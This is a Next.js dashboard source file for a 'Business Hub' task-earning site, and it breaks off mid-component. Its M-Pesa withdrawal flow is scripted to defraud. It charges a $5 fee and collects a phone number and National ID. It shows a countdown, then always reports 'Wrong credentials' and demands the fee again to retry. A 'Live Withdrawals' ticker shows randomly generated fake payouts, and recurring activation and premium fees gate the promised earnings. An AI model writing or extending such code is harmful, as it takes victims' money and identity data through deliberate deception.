// pages/dashboard.js
// ─────────────────────────────────────────────────────────────────────────────
// Business Hub Dashboard
// M-Pesa Withdrawal flow:
//   1. User clicks "Withdraw with M-Pesa" → pays KES 5 (simulated locally)
//   2. Fee confirmed → Withdrawal Details Form (phone + ID number only)
//   3. Submit form → "Payment will be initiated in 2 minutes" screen
//   4. 1:32 countdown expires → "Wrong credentials" failure
//   5. User dismisses → cycle resets (fee required again to retry)
// ─────────────────────────────────────────────────────────────────────────────

import { useEffect, useState, useCallback, useRef } from 'react';
import { useRouter } from 'next/router';
import Link from 'next/link';
import { getCurrentUser, logout, activateUser } from '../lib/auth';
import { TASKS } from '../lib/tasks';

// ─── Helpers ─────────────────────────────────────────────────────────────────

function getOrGenerateWithdrawals() {
  const LS_KEY = 'bh_live_withdrawals';
  try {
    const stored = localStorage.getItem(LS_KEY);
    if (stored) return JSON.parse(stored);
  } catch (_) {}

  const kenyaSrc  = { flag: '🇰🇪', country: 'Kenya', prefixes: ['+25471','+25472','+25473','+25474','+25475','+25476','+25477','+25478','+25479','+25470'] };
  const otherSrcs = [
    { flag: '🇺🇬', country: 'Uganda',       prefixes: ['+25670','+25678','+25679'] },
    { flag: '🇹🇿', country: 'Tanzania',     prefixes: ['+25575','+25568'] },
    { flag: '🇳🇬', country: 'Nigeria',      prefixes: ['+23481','+23490'] },
    { flag: '🇬🇭', country: 'Ghana',        prefixes: ['+23354','+23324'] },
    { flag: '🇷🇼', country: 'Rwanda',       prefixes: ['+25078','+25072'] },
    { flag: '🇿🇦', country: 'South Africa', prefixes: ['+27821','+27831'] },
    { flag: '🇪🇹', country: 'Ethiopia',     prefixes: ['+25191','+25193'] },
    { flag: '🇨🇲', country: 'Cameroon',     prefixes: ['+23767','+23769'] },
    { flag: '🇲🇼', country: 'Malawi',       prefixes: ['+26599','+26588'] },
  ];

  const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
  const mask = p => `${p}*****${String(rand(10, 99))}`;

  const pinned = { flag: '🇰🇪', country: 'Kenya', phone: '+254111*****12', amount: 3000 };

  // 40 Kenyan + 10 other countries (amounts 2562–8928); pinned replaces every other slot
  const base = [
    ...Array.from({ length: 40 }, () => {
      const prefix = kenyaSrc.prefixes[rand(0, kenyaSrc.prefixes.length - 1)];
      return { flag: kenyaSrc.flag, country: kenyaSrc.country, phone: mask(prefix), amount: rand(2562, 8928) };
    }),
    ...Array.from({ length: 10 }, () => {
      const src    = otherSrcs[rand(0, otherSrcs.length - 1)];
      const prefix = src.prefixes[rand(0, src.prefixes.length - 1)];
      return { flag: src.flag, country: src.country, phone: mask(prefix), amount: rand(2562, 8928) };
    }),
  ];

  // Shuffle base list so Kenyan/other are mixed
  for (let i = base.length - 1; i > 0; i--) {
    const j = rand(0, i);
    [base[i], base[j]] = [base[j], base[i]];
  }

  // Build 100-item list: pinned appears at every odd slot (every 2.5 s a random, then pinned, repeat)
  const records = [];
  base.forEach(item => { records.push(item); records.push(pinned); });

  try { localStorage.setItem(LS_KEY, JSON.stringify(records)); } catch (_) {}
  return records;
}

function formatCountdown(ms) {
  if (ms <= 0) return '00:00:00';
  const totalSec = Math.floor(ms / 1000);
  const h = Math.floor(totalSec / 3600);
  const m = Math.floor((totalSec % 3600) / 60);
  const s = totalSec % 60;
  return [h, m, s].map(v => String(v).padStart(2, '0')).join(':');
}

function formatMmSs(ms) {
  if (ms <= 0) return '0:00';
  const totalSec = Math.floor(ms / 1000);
  const m = Math.floor(totalSec / 60);
  const s = totalSec % 60;
  return `${m}:${String(s).padStart(2, '0')}`;
}

// ─── M-Pesa Withdrawal: Step 1 — Pay $5 USD via Paystack ─────────────────────
function MpesaFeeModal({ user, onClose }) {
  const [phone,   setPhone]   = useState(user?.phone || '');
  const [loading, setLoading] = useState(false);

  async function handlePay() {
    if (!phone.trim()) { alert('Enter your M-Pesa number'); return; }
    setLoading(true);
    try {
      const res  = await fetch('/api/paystack/initialize', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email:    user.email,
          amount:   650,
          phone,
          plan:     'mpesa_withdrawal_fee',
        }),
      });
      const data = await res.json();
      if (data.status) {
        window.location.href = data.data.authorization_url;
      } else {
        alert('Payment could not be initiated. Please try again.');
        setLoading(false);
      }
    } catch (_) {
      alert('Network error. Please check your connection.');
      setLoading(false);
    }
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}>
          <div>
            <div className="pay-modal-title">📲 Withdraw with M-Pesa</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Small processing fee required</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>
        <div className="pay-modal-body">
          {!loading ? (
            <>
              <div className="pay-message" style={{ borderColor: '#007A3D', background: '#F0FFF4' }}>
                A one-time <strong>processing fee of $5 USD</strong> is required to access the M-Pesa withdrawal form. The amount will be converted to KES automatically.
              </div>
              <div className="pay-amount">
                <div className="pay-amount-label">M-Pesa Processing Fee</div>
                <div className="pay-amount-value" style={{ color: '#007A3D' }}>$5 USD</div>
                <div className="pay-amount-sub">Converted to KES automatically • Unlocks withdrawal form</div>
              </div>
              <div className="pay-phone-label">M-Pesa Number</div>
              <input
                className="pay-phone-input"
                value={phone}
                onChange={e => setPhone(e.target.value)}
                placeholder="+254 7XX XXX XXX"
              />
              <button
                className="pay-btn"
                style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}
                onClick={handlePay}
                disabled={loading}
              >
                🔒 Pay $5 USD via Paystack
              </button>
              <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
            </>
          ) : (
            <div style={{ textAlign: 'center', padding: '48px 0' }}>
              <div className="spinner" style={{ width: 48, height: 48, borderTopColor: '#007A3D', borderColor: 'var(--gray-light)', borderWidth: 3, margin: '0 auto 20px' }} />
              <p style={{ fontWeight: 600, marginBottom: 6 }}>Redirecting to Paystack...</p>
              <p style={{ fontSize: 13, color: 'var(--gray)' }}>Complete the $5 USD payment to unlock your withdrawal form.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── M-Pesa Withdrawal: Step 2 — Credentials Form ────────────────────────────
function MpesaFormModal({ onClose, onSubmit }) {
  const [phone,    setPhone]    = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});

  function handleSubmit() {
    const errs = {};
    if (!phone.trim())    errs.phone    = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }
    onSubmit();
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" style={{ maxWidth: 460 }} onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}>
          <div>
            <div className="pay-modal-title">📲 Withdrawal Details</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Enter your M-Pesa number and National ID</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>
        <div className="pay-modal-body">
          <div className="pay-message" style={{ borderColor: '#007A3D', background: '#F0FFF4', marginBottom: 20 }}>
            Enter your details accurately. Your National ID must match your M-Pesa registration.
          </div>
          <div className="pay-phone-label">M-Pesa Phone Number</div>
          <input
            className="pay-phone-input"
            type="tel"
            value={phone}
            onChange={e => { setPhone(e.target.value); setErrors(prev => ({ ...prev, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX"
            style={{ borderColor: errors.phone ? '#ef4444' : undefined }}
          />
          {errors.phone && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input
            className="pay-phone-input"
            type="text"
            value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(prev => ({ ...prev, idNumber: undefined })); }}
            placeholder="e.g. 12345678"
            style={{ borderColor: errors.idNumber ? '#ef4444' : undefined }}
          />
          {errors.idNumber && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button
            className="pay-btn"
            style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginTop: 20 }}
            onClick={handleSubmit}
          >
            💸 Submit Withdrawal Request
          </button>
          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
        </div>
      </div>
    </div>
  );
}

// ─── M-Pesa Withdrawal: Step 3 — 1:32 Countdown ──────────────────────────────
function MpesaPendingModal({ onClose, onExpired }) {
  const DURATION_MS = 92 * 1000; // 1 minute 32 seconds
  const deadlineRef = useRef(Date.now() + DURATION_MS);
  const [remaining, setRemaining] = useState(DURATION_MS);

  useEffect(() => {
    const timer = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) {
        clearInterval(timer);
        setTimeout(() => onExpired(), 800);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [onExpired]);

  const pct = Math.min(100, Math.max(0, (remaining / DURATION_MS) * 100));
  const isLow = remaining < 30 * 1000;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" style={{ maxWidth: 440 }} onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}>
          <div>
            <div className="pay-modal-title">⏳ Initiating Payment</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.75)', marginTop: 2 }}>Your request is being processed</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>

        <div className="pay-modal-body" style={{ padding: '28px 28px 24px' }}>
          <div style={{ background: '#F0FFF4', border: '1.5px solid #6EE7B7', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ fontSize: 22, flexShrink: 0 }}>📲</span>
            <p style={{ margin: 0, fontSize: 14, color: '#065F46', lineHeight: 1.65 }}>
              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
            </p>
          </div>

          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>
              Time Remaining
            </div>
            <div style={{
              fontFamily: 'monospace',
              fontSize: 52,
              fontWeight: 800,
              letterSpacing: 4,
              color: isLow ? '#ef4444' : '#007A3D',
              background: '#F0FFF4',
              borderRadius: 14,
              padding: '14px 24px',
              display: 'inline-block',
              border: `2px solid ${isLow ? '#FECACA' : '#6EE7B7'}`,
              minWidth: 160,
              transition: 'color 0.3s, border-color 0.3s',
            }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#D1FAE5', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{
                height: '100%',
                width: `${pct}%`,
                background: isLow ? 'linear-gradient(90deg, #ef4444, #DC2626)' : 'linear-gradient(90deg, #007A3D, #00A651)',
                borderRadius: 99,
                transition: 'width 1s linear, background 0.3s',
              }} />
            </div>
          </div>

          <div className="withdraw-detail-card" style={{ background: '#F0FFF4', borderColor: '#6EE7B7', marginBottom: 20 }}>
            <div>
              <div className="withdraw-detail-label">Status</div>
              <div className="withdraw-detail-value pending" style={{ color: '#007A3D' }}>
                <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#00A651', display: 'inline-block', marginRight: 6, animation: 'pulse 1.5s infinite' }} />
                Payment Pending
              </div>
            </div>
            <div className="withdraw-detail-icon">📲</div>
          </div>

          <button className="withdraw-close-btn" onClick={onClose}>Close</button>
          <div className="withdraw-footer-note">
            Do not close the app. Keep your M-Pesa line active and await the STK push.
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── M-Pesa Withdrawal: Step 4 — Wrong Credentials ───────────────────────────
function MpesaFailedModal({ onClose, onReset }) {
  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" style={{ maxWidth: 440 }} onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #DC2626, #B91C1C)' }}>
          <div>
            <div className="pay-modal-title">❌ Payment Declined</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Verification unsuccessful</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>

        <div className="pay-modal-body" style={{ padding: '28px 28px 24px' }}>
          <div style={{
            background: '#FEF2F2',
            border: '1.5px solid #FECACA',
            borderRadius: 12,
            padding: '16px 18px',
            marginBottom: 22,
            display: 'flex',
            gap: 12,
            alignItems: 'flex-start',
          }}>
            <span style={{ fontSize: 24, flexShrink: 0 }}>⚠️</span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#991B1B' }}>
                Wrong Credentials
              </p>
              <p style={{ margin: 0, fontSize: 13, color: '#7F1D1D', lineHeight: 1.65 }}>
                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
              </p>
            </div>
          </div>

          <div className="withdraw-detail-card" style={{ background: '#FEF2F2', borderColor: '#FECACA', marginBottom: 20 }}>
            <div>
              <div className="withdraw-detail-label">Status</div>
              <div className="withdraw-detail-value" style={{ color: '#DC2626', fontWeight: 700, display: 'flex', alignItems: 'center', gap: 6 }}>
                <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#DC2626', display: 'inline-block', flexShrink: 0 }} />
                Declined
              </div>
            </div>
            <div className="withdraw-detail-icon">❌</div>
          </div>

          <button
            className="pay-btn"
            style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }}
            onClick={onReset}
          >
            🔄 Try Again
          </button>
          <button className="withdraw-close-btn" onClick={onClose}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#DC2626' }}>
            Please ensure your phone number and National ID match your M-Pesa registration.
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── M-Pesa Withdrawal Controller ────────────────────────────────────────────
function MpesaWithdrawModal({ user, onClose, initialStep = 'fee' }) {
  const [step, setStep] = useState(initialStep);

  const handleReset = useCallback(() => setStep('fee'), []);

  if (step === 'fee') {
    return <MpesaFeeModal user={user} onClose={onClose} />;
  }
  if (step === 'form') {
    return <MpesaFormModal onClose={onClose} onSubmit={() => setStep('pending')} />;
  }
  if (step === 'pending') {
    return <MpesaPendingModal onClose={onClose} onExpired={() => setStep('failed')} />;
  }
  return <MpesaFailedModal onClose={onClose} onReset={handleReset} />;
}

// ─── Task Detail Modal ────────────────────────────────────────────────────────
function TaskModal({ task, user, onClose, onBidClick, onUpgradeClick }) {
  if (!task) return null;
  const isActivated = user?.activated;
  const isPremium   = user?.premium;

  function handleSubmit() {
    if (!isPremium) { onClose(); onUpgradeClick(); return; }
    const subject = encodeURIComponent('Task Submission: ' + task.title);
    const body    = encodeURIComponent(
      `Hello Business Hub,\n\nI am submitting my completed task for review.\n\nTask: ${task.title}\nCategory: ${task.category}\nPayment: KES ${task.payment.toLocaleString()}\n\nPlease find my submission below:\n\n[Add your work here]\n\nThank you,\n${user?.fullName || ''}`
    );
    window.location.href = `mailto:businesshub.comke@gmail.com?subject=${subject}&body=${body}`;
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-card" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <div className="modal-title">{task.title}</div>
          <button className="modal-close" onClick={onClose}>×</button>
        </div>
        <div className="modal-body">
          <div className="modal-meta">
            {[
              ['Posted By',   `👤 ${task.poster}`],
              ['Location',    `📍 ${task.location}`],
              ['Date Posted', `📅 ${task.datePosted}`],
              ['Category',    `🏷️ ${task.category}`],
            ].map(([label, value]) => (
              <div key={label} className="modal-meta-item">
                <div className="modal-meta-label">{label}</div>
                <div className="modal-meta-value">{value}</div>
              </div>
            ))}
          </div>
          <div className="modal-payment">
            <div>
              <div className="modal-payment-label">Task Payment</div>
              <div style={{ fontSize: 13, color: 'var(--green)', opacity: 0.7, marginTop: 2 }}>Paid on approval</div>
            </div>
            <div className="modal-payment-amount">KES {task.payment.toLocaleString()}</div>
          </div>
          <p className="modal-desc">{task.description}</p>
          {task.questions?.length > 0 && (
            <div className="modal-questions">
              <h4>Questions from Poster</h4>
              {task.questions.map((q, i) => (
                <div key={i} className="modal-question-item">{q}</div>
              ))}
            </div>
          )}
          {!isActivated && (
            <button className="bid-btn" onClick={() => onBidClick(task)}>💼 Bid on This Task</button>
          )}
          {isActivated && !isPremium && (
            <button className="submit-btn" onClick={handleSubmit} style={{ background: 'linear-gradient(135deg, #125C37, #1A7A4A)' }}>⭐ Upgrade to Premium to Submit</button>
          )}
          {isActivated && isPremium && (
            <button className="submit-btn" onClick={handleSubmit}>📤 Submit This Task</button>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── Account Activation Payment Modal ────────────────────────────────────────
function PaymentModal({ task, user, onClose, onSuccess }) {
  const [phone,   setPhone]   = useState(user?.phone || '');
  const [loading, setLoading] = useState(false);
  const [step,    setStep]    = useState('prompt');

  async function handlePay() {
    if (!phone.trim()) { alert('Enter phone number'); return; }
    setLoading(true);
    setStep('processing');
    const res  = await fetch('/api/paystack/initialize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: user.email, amount: 50, phone, plan: 'activation' }),
    });
    const data = await res.json();
    if (data.status) {
      window.location.href = data.data.authorization_url;
    } else {
      alert('Payment failed. Please try again.');
      setStep('prompt');
    }
    setLoading(false);
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header">
          <div className="pay-modal-title">BUSINESS HUB</div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>
        <div className="pay-modal-body">
          {step === 'prompt' && (
            <>
              <div className="pay-message">
                Pay <strong>KES 50</strong> to unlock bidding on tasks for <strong style={{ color: 'var(--green)' }}>3 days</strong>. Renew every 3 days to keep access.
              </div>
              <div className="pay-amount">
                <div className="pay-amount-label">Activation Fee</div>
                <div className="pay-amount-value">KES 50<span style={{ fontSize: 14, fontWeight: 400, color: 'var(--gray)' }}>/3 days</span></div>
                <div className="pay-amount-sub">Valid for 3 days • Renew to continue bidding</div>
              </div>
              <div className="pay-phone-label">M-Pesa / Mobile Money Number</div>
              <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
              <button className="pay-btn" onClick={handlePay} disabled={loading}>
                {loading ? <><span className="spinner" /> Processing...</> : '🔒 Pay via Paystack'}
              </button>
              <div className="pay-secure">🔐 Secured by Paystack • M-Pesa supported</div>
            </>
          )}
          {step === 'processing' && (
            <div style={{ textAlign: 'center', padding: '40px 0' }}>
              <div className="spinner" style={{ width: 40, height: 40, borderTopColor: 'var(--green)', borderColor: 'var(--gray-light)', borderWidth: 3, margin: '0 auto 16px' }} />
              <p>Redirecting to payment gateway...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── Upgrade to Premium Modal ─────────────────────────────────────────────────
function UpgradeModal({ user, onClose }) {
  const [phone,   setPhone]   = useState(user?.phone || '');
  const [loading, setLoading] = useState(false);

  async function handleUpgrade() {
    if (!phone.trim()) { alert('Enter phone number'); return; }
    setLoading(true);
    const res  = await fetch('/api/paystack/initialize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: user.email, amount: 480, phone, plan: 'premium' }),
    });
    const data = await res.json();
    if (data.status) {
      window.location.href = data.data.authorization_url;
    } else {
      alert('Payment initiation failed. Please try again.');
    }
    setLoading(false);
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #125C37, #1A7A4A)' }}>
          <div>
            <div className="pay-modal-title">⭐ PREMIUM</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginTop: 2 }}>KES 480 / 3 days • Required to submit tasks</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>
        <div className="pay-modal-body">
          <div className="premium-features">
            {[
              ['🚀', 'Unlimited task bidding'],
              ['💰', 'Priority payouts & withdrawals'],
              ['📊', 'Advanced earnings dashboard'],
              ['🎯', 'Exclusive high-paying tasks'],
              ['🏆', 'Premium badge on your profile'],
              ['📞', 'Dedicated support line'],
            ].map(([icon, text]) => (
              <div key={text} className="premium-feature-item">
                <span>{icon}</span><span>{text}</span>
              </div>
            ))}
          </div>
          <div className="pay-amount" style={{ marginTop: 20 }}>
            <div className="pay-amount-label">Premium — Submit Tasks</div>
            <div className="pay-amount-value">KES 480<span style={{ fontSize: 14, fontWeight: 400, color: 'var(--gray)' }}>/3 days</span></div>
            <div className="pay-amount-sub">Valid for 3 days • Required to submit tasks</div>
          </div>
          <div className="pay-phone-label">M-Pesa / Mobile Money Number</div>
          <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
          <button className="pay-btn" onClick={handleUpgrade} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing...</> : '⭐ Upgrade to Premium'}
          </button>
          <div className="pay-secure">🔐 Secured by Paystack • M-Pesa supported</div>
        </div>
      </div>
    </div>
  );
}

// ─── Training Payment Modal ───────────────────────────────────────────────────
function TrainingModal({ user, onClose }) {
  const [phone,   setPhone]   = useState(user?.phone || '');
  const [loading, setLoading] = useState(false);

  async function handleTrainingPay() {
    if (!phone.trim()) { alert('Enter phone number'); return; }
    setLoading(true);
    const res  = await fetch('/api/paystack/initialize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: user.email, amount: 132, phone, plan: 'training' }),
    });
    const data = await res.json();
    if (data.status) {
      window.location.href = data.data.authorization_url;
    } else {
      alert('Payment initiation failed. Please try again.');
    }
    setLoading(false);
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" style={{ maxWidth: 460 }} onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #059669, #1A7A4A)' }}>
          <div>
            <div className="pay-modal-title">🎓 TRAINING</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginTop: 2 }}>Apply for professional training</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>
        <div className="pay-modal-body">
          <div className="premium-features">
            {[
              ['📚', 'Access to all training materials'],
              ['🎯', 'Hands-on practical assignments'],
              ['🏆', 'Certificate of completion'],
              ['👨‍🏫', 'Expert instructor support'],
              ['💼', 'Job placement assistance'],
              ['♾️', 'Lifetime access to course content'],
            ].map(([icon, text]) => (
              <div key={text} className="premium-feature-item">
                <span>{icon}</span><span>{text}</span>
              </div>
            ))}
          </div>
          <div className="pay-amount" style={{ marginTop: 20 }}>
            <div className="pay-amount-label">Training Registration Fee</div>
            <div className="pay-amount-value">KES 132</div>
            <div className="pay-amount-sub">One-time payment • Instant access</div>
          </div>
          <div className="pay-phone-label">M-Pesa / Mobile Money Number</div>
          <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #059669, #1A7A4A)' }} onClick={handleTrainingPay} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing...</> : '🎓 Pay & Apply Now'}
          </button>
          <div className="pay-secure">🔐 Secured by Paystack • M-Pesa supported</div>
        </div>
      </div>
    </div>
  );
}

// ─── Referral Modal ───────────────────────────────────────────────────────────
function ReferralModal({ user, onClose }) {
  const [copied, setCopied] = useState(false);

  const referralLink = user?.activated
    ? `https://onlinejob-pi.vercel.app/join?ref=${user.id || 'USER123'}`
    : 'Activate your account to unlock referral link';

  function copyLink() {
    navigator.clipboard.writeText(referralLink).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="pay-modal-card" style={{ maxWidth: 460 }} onClick={e => e.stopPropagation()}>
        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #059669, #1A7A4A)' }}>
          <div>
            <div className="pay-modal-title">🔗 Your Referral Link</div>
            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginTop: 2 }}>Earn KES 132 per referral</div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
        </div>
        <div className="pay-modal-body">
          <div className="pay-message" style={{ borderColor: '#059669', background: '#F0FFF4' }}>
            Share your referral link and earn <strong style={{ color: '#059669' }}>KES 132</strong> for every friend who signs up and activates their account.
          </div>
          <div style={{ marginBottom: 16 }}>
            <div className="pay-phone-label">Your unique referral link</div>
            <div style={{ display: 'flex', gap: 8 }}>
              <input
                className="pay-phone-input"
                value={referralLink}
                readOnly
                style={{ fontSize: 13, flex: 1, marginBottom: 0 }}
              />
              <button
                onClick={copyLink}
                style={{ padding: '0 20px', background: copied ? '#059669' : 'var(--green)', color: '#fff', borderRadius: 8, fontWeight: 700, fontSize: 14, border: 'none', cursor: 'pointer', transition: 'background 0.2s', whiteSpace: 'nowrap' }}
              >
                {copied ? '✓ Copied!' : 'Copy'}
              </button>
            </div>
          </div>
          <div className="referral-stats">
            <div className="referral-stat">
              <div className="referral-stat-num">{user?.referralCount || 0}</div>
              <div className="referral-stat-label">Referrals</div>
            </div>
            <div className="referral-stat">
              <div className="referral-stat-num">KES {((user?.referralCount || 0) * 132).toLocaleString()}</div>
              <div className="referral-stat-label">Earned</div>
            </div>
            <div className="referral-stat">
              <div className="referral-stat-num">KES 132</div>
              <div className="referral-stat-label">Per Referral</div>
            </div>
          </div>
          <div style={{ display: 'flex', gap: 10, marginTop: 20 }}>
            {[
              { label: '📱 WhatsApp', color: '#25D366', url: `https://wa.me/?text=Join%20Business%20Hub%20and%20earn%20online!%20${encodeURIComponent(referralLink)}` },
              { label: '✉️ Email',    color: '#EA4335', url: `mailto:?subject=Join%20Business%20Hub&body=Hey!%20Join%20me%20on%20Business%20Hub.%20Use%20my%20link:%20${encodeURIComponent(referralLink)}` },
            ].map(btn => (
              <a key={btn.label} href={user?.activated ? btn.url : '#'} target="_blank" rel="noopener noreferrer"
                style={{ flex: 1, padding: 12, background: btn.color, color: '#fff', borderRadius: 8, fontWeight: 700, fontSize: 14, textAlign: 'center', display: 'block', opacity: user?.activated ? 1 : 0.5, pointerEvents: user?.activated ? 'auto' : 'none' }}>
                {btn.label}
              </a>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Live Withdrawals — Animated Ticker ──────────────────────────────────────
function LiveWithdrawalsTicker({ withdrawals }) {
  const [visibleItems, setVisibleItems] = useState([]);
  const [animatingIn, setAnimatingIn]  = useState(null);
  const indexRef = useRef(0);

  useEffect(() => {
    if (!withdrawals.length) return;
    setVisibleItems(withdrawals.slice(0, 5));
    indexRef.current = 5;
  }, [withdrawals]);

  useEffect(() => {
    if (!withdrawals.length) return;
    const interval = setInterval(() => {
      const nextIdx  = indexRef.current % withdrawals.length;
      const nextItem = withdrawals[nextIdx];
      setAnimatingIn(nextItem);
      indexRef.current = nextIdx + 1;

      setTimeout(() => {
        setVisibleItems(prev => {
          const updated = [...prev.slice(1), nextItem];
          return updated;
        });
        setAnimatingIn(null);
      }, 500);
    }, 2500);
    return () => clearInterval(interval);
  }, [withdrawals]);

  return (
    <div className="withdrawals-feed">
      <div className="withdrawals-header">
        <div className="withdrawals-title">
          <span className="live-dot" />
          Live Withdrawals
        </div>
        <div className="withdrawals-badge">Instant M-Pesa Payouts</div>
      </div>

      <div className="ticker-strip">
        <div className="ticker-track">
          {[...withdrawals, ...withdrawals].map((item, i) => (
            <div key={i} className="ticker-pill">
              <span className="ticker-flag">{item.flag}</span>
              <span className="ticker-phone">{item.phone}</span>
              <span className="ticker-amount">KES {item.amount.toLocaleString()}</span>
              <span className="ticker-success">✓</span>
            </div>
          ))}
        </div>
      </div>

      <div className="withdrawals-list">
        {visibleItems.map((item, index) => (
          <div
            key={`${item.phone}-${index}`}
            className={`withdrawal-item ${animatingIn && index === visibleItems.length - 1 ? 'slide-in' : ''}`}
          >
            <div className="withdrawal-user">
              <div className="withdrawal-avatar">{item.flag}</div>
              <div className="withdrawal-info">
                <h4>{item.phone}</h4>
                <p>{item.country}</p>
              </div>
            </div>
            <div className="withdrawal-amount">
              <h3>KES {item.amount.toLocaleString()}</h3>
              <span className="withdrawal-status-badge">
                <span className="wd-dot" />
                Successful
              </span>
            </div>
          </div>
        ))}
      </div>

      <div className="wd-footer">
        <span className="wd-footer-text">🔒 All payouts verified & secured</span>
        <span className="wd-footer-count">{withdrawals.length} payouts today</span>
      </div>
    </div>
  );
}

// ─── Hamburger Menu ───────────────────────────────────────────────────────────
function HamburgerMenu({ user, onClose, onUpgrade, onMpesaWithdraw, onReferral, onTraining, onLogout }) {
  const items = [
    { icon: '🏠', label: 'Dashboard',            action: () => { onClose(); } },
    { icon: '⭐', label: 'Upgrade to Premium',   action: () => { onClose(); onUpgrade(); } },
